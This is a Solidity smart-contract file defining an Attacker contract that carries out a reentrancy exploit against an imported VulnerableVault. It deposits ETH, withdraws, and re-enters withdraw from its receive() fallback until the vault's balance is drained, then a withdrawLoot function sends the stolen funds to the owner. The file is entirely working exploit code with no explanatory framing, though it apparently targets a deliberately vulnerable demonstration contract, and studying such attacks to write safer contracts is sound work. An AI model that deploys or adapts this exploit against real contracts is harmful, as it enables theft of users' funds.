// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "No ETH");

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
